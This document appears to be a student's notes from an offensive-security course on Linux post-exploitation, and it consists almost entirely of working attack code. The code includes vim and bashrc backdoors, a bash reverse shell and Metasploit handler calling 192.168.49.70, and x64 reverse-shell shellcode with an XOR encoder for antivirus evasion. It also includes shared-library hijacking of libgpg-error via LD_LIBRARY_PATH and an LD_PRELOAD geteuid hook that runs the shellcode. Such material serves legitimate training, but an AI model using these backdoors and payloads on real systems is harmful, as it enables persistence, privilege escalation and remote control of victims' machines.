# LINUX POST-EXPLOITATION
## VIM Config Simple Backdoor
### .vimrc content
```
:echo "this is a test"
:!touch /tmp/test.txt
:!source ~/.vimrunscript
:silent !source ~/.vimrunscript # no command output
```
### .vimrunscript
```
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```
### Explain vim backdoor
When User Execute vi or vim command ï¼Œ.vimrc wil inititial environment file to execute command
## Bash Environment Back Door
### .bashrc
```
alias sudo="sudo -E" # With environment file
```
### reverse root shell
#### sudo -l
```
Matching Defaults entries for linuxvictim on linuxvictim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxvictim may run the following commands on linuxvictim:
    (root) NOPASSWD: /usr/bin/vim /opt/important.conf
```
#### /tmp/script.txt
```
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.70/8080 0>&1 &

```
#### .vimrc
```
:if $USER == "root"
:silent !source /tmp/script.txt
:endif
```
### autocmd BufWritePost
```
:if $USER == "root"
:silent autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

```
sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST 192.168.49.70;set LPORT 443;exploit -j"
```
### Linux Bypass AV
gcc -o shell shell.c -z execstack
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x46\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
// Run our shellcode
        int (*ret)() = (int(*)())buf;
        ret();
}
```
### Linux encoder 
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x46\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
	char xor_key = 'J';
	int payload_length = (int) sizeof(buf);
	for (int i=0; i<payload_length; i++)
	{
	printf("\\x%02X",buf[i]^xor_key);
	}
	return 0;
}

```
### Linux Xor Bypass AV
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "\x02\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\xF8\x4D\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x7B\x0C\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
	char xor_key = 'J';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
	buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}
```
### Shared Library Hijacking via LD_LIBRARY_PATH
```
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0| grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'

gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -o libhax.so hax.o
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o

alias sudo="sudo LD_LIBRARY_PATH=/tmp"
```
#### hax.c
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

int gpgrt_printf_unlocked;
int gpgrt_fclose;
int gpgrt_fdopen;
int gpgrt_fpopen_nc;
int _gpgrt_getc_underflow;
int gpgrt_set_syscall_clamp;
int gpgrt_fputs;
int gpgrt_vsnprintf;
int gpgrt_fgets;
int gpgrt_write_sanitized;
int gpgrt_fileno;
int gpgrt_set_binary;
int gpgrt_lock_lock;
int gpgrt_write_hexstring;
int gpgrt_getline;
int gpgrt_fopenmem_init;
int gpgrt_printf;
int gpgrt_freopen;
int gpg_strsource;
int gpg_err_set_errno;
int gpgrt_sysopen_nc;
int gpgrt_rewind;
int gpgrt_setbuf;
int gpgrt_ferror_unlocked;
int gpgrt_mopen;
int gpgrt_read_line;
int gpgrt_feof;
int gpgrt_sysopen;
int gpgrt_set_alloc_func;
int gpgrt_funlockfile;
int gpgrt_read;
int gpgrt_fopen;
int _gpgrt_pending;
int gpgrt_clearerr_unlocked;
int gpgrt_get_nonblock;
int gpg_strerror_r;
int gpgrt_b64dec_proc;
int gpgrt_ferror;
int gpgrt_fprintf;
int gpgrt_fflush;
int gpgrt_poll;

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
	setuid(0);
	setgid(0);
	printf("DLL HIJACKING IN PROGRESS \n");
	system("touch /tmp/haxso.txt");
}
	
```
#### gpg.map
```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
gpgrt_ungetc;
gpg_err_init;
gpgrt_tmpfile;
gpgrt_fputs_unlocked;
gpgrt_ftello;
gpgrt_flockfile;
gpgrt_get_syscall_clamp;
gpg_err_code_from_errno;
gpgrt_clearerr;
gpg_error_check_version;
gpgrt_vfprintf;
gpgrt_opaque_set;
gpgrt_vasprintf;
gpgrt_fprintf_unlocked;
gpgrt_lock_init;
gpgrt_ftell;
gpgrt_fseeko;
gpgrt_syshd;
gpgrt_check_version;
gpgrt_setvbuf;
gpgrt_ftrylockfile;
gpgrt_lock_destroy;
gpgrt_fname_set;
gpgrt_bsprintf;
_gpgrt_set_std_fd;
_gpgrt_pending_unlocked;
gpgrt_fclose_snatch;
gpgrt_fwrite;
gpgrt_fseek;
_gpgrt_get_std_stream;
gpg_err_code_from_syserror;
gpgrt_asprintf;
gpg_err_code_to_errno;
gpgrt_free;
gpgrt_syshd_unlocked;
gpgrt_set_nonblock;
gpgrt_fread;
gpgrt_fdopen_nc;
gpgrt_opaque_get;
gpgrt_fopenmem;
gpgrt_lock_unlock;
gpg_err_deinit;
gpgrt_b64dec_start;
gpgrt_b64dec_finish;
gpgrt_fname_get;
gpgrt_fpopen;
gpgrt_fputc;
gpgrt_snprintf;
gpgrt_lock_trylock;
gpgrt_fgetc;
gpg_strerror;
gpgrt_fopencookie;
gpgrt_fileno_unlocked;
gpgrt_vfprintf_unlocked;
gpgrt_yield;
gpgrt_write;
gpgrt_printf_unlocked;
gpgrt_fclose;
gpgrt_fdopen;
gpgrt_fpopen_nc;
_gpgrt_getc_underflow;
gpgrt_set_syscall_clamp;
gpgrt_fputs;
gpgrt_vsnprintf;
gpgrt_fgets;
gpgrt_write_sanitized;
gpgrt_fileno;
gpgrt_set_binary;
gpgrt_lock_lock;
gpgrt_write_hexstring;
gpgrt_getline;
gpgrt_fopenmem_init;
gpgrt_printf;
gpgrt_freopen;
gpg_strsource;
gpg_err_set_errno;
gpgrt_sysopen_nc;
gpgrt_rewind;
gpgrt_setbuf;
gpgrt_ferror_unlocked;
gpgrt_mopen;
gpgrt_read_line;
gpgrt_feof;
gpgrt_sysopen;
gpgrt_set_alloc_func;
gpgrt_funlockfile;
gpgrt_read;
gpgrt_fopen;
_gpgrt_pending;
gpgrt_clearerr_unlocked;
gpgrt_get_nonblock;
gpg_strerror_r;
gpgrt_b64dec_proc;
gpgrt_ferror;
gpgrt_fprintf;
gpgrt_fflush;
gpgrt_poll;
}
```
### 10.3.2.2 Extra Mile
```
gcc -Wall -fPIC -c -o hax.o shell.c -z execstack
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o -z execstack

alias sudo="sudo LD_LIBRARY_PATH=/tmp" >> .bashrc

```
#### shell.c
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
int gpgrt_vbsprintf;
int gpgrt_ungetc;
int gpg_err_init;
int gpgrt_tmpfile;
int gpgrt_fputs_unlocked;
int gpgrt_ftello;
int gpgrt_flockfile;
int gpgrt_get_syscall_clamp;
int gpg_err_code_from_errno;
int gpgrt_clearerr;
int gpg_error_check_version;
int gpgrt_vfprintf;
int gpgrt_opaque_set;
int gpgrt_vasprintf;
int gpgrt_fprintf_unlocked;
int gpgrt_lock_init;
int gpgrt_ftell;
int gpgrt_fseeko;
int gpgrt_syshd;
int gpgrt_check_version;
int gpgrt_setvbuf;
int gpgrt_ftrylockfile;
int gpgrt_lock_destroy;
int gpgrt_fname_set;
int gpgrt_bsprintf;
int _gpgrt_set_std_fd;
int _gpgrt_pending_unlocked;
int gpgrt_fclose_snatch;
int gpgrt_fwrite;
int gpgrt_fseek;
int _gpgrt_get_std_stream;
int gpg_err_code_from_syserror;
int gpgrt_asprintf;
int gpg_err_code_to_errno;
int gpgrt_free;
int gpgrt_syshd_unlocked;
int gpgrt_set_nonblock;
int gpgrt_fread;
int gpgrt_fdopen_nc;
int gpgrt_opaque_get;
int gpgrt_fopenmem;
int gpgrt_lock_unlock;
int gpg_err_deinit;
int gpgrt_b64dec_start;
int gpgrt_b64dec_finish;
int gpgrt_fname_get;
int gpgrt_fpopen;
int gpgrt_fputc;
int gpgrt_snprintf;
int gpgrt_lock_trylock;
int gpgrt_fgetc;
int gpg_strerror;
int gpgrt_fopencookie;
int gpgrt_fileno_unlocked;
int gpgrt_vfprintf_unlocked;
int gpgrt_yield;
int gpgrt_write;
int gpgrt_printf_unlocked;
int gpgrt_fclose;
int gpgrt_fdopen;
int gpgrt_fpopen_nc;
int _gpgrt_getc_underflow;
int gpgrt_set_syscall_clamp;
int gpgrt_fputs;
int gpgrt_vsnprintf;
int gpgrt_fgets;
int gpgrt_write_sanitized;
int gpgrt_fileno;
int gpgrt_set_binary;
int gpgrt_lock_lock;
int gpgrt_write_hexstring;
int gpgrt_getline;
int gpgrt_fopenmem_init;
int gpgrt_printf;
int gpgrt_freopen;
int gpg_strsource;
int gpg_err_set_errno;
int gpgrt_sysopen_nc;
int gpgrt_rewind;
int gpgrt_setbuf;
int gpgrt_ferror_unlocked;
int gpgrt_mopen;
int gpgrt_read_line;
int gpgrt_feof;
int gpgrt_sysopen;
int gpgrt_set_alloc_func;
int gpgrt_funlockfile;
int gpgrt_read;
int gpgrt_fopen;
int _gpgrt_pending;
int gpgrt_clearerr_unlocked;
int gpgrt_get_nonblock;
int gpg_strerror_r;
int gpgrt_b64dec_proc;
int gpgrt_ferror;
int gpgrt_fprintf;
int gpgrt_fflush;
int gpgrt_poll;

static void runshell()__attribute__((constructor));


void runshell() {
	unsigned char buf[] = "\x02\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\xF8\x4D\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x7B\x0C\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
	
	char xor_key = 'J';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}
```

### 10.3.3.1 Exercises
```
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
export LD_PRELOAD=/tmp/evil_geteuid.so
```
```
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = "\x02\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\xF8\x4D\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x7B\x0C\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";



uid_t geteuid(void)
{
    char xor_key = 'J';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
    
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    
    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
        {
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2;
}
```

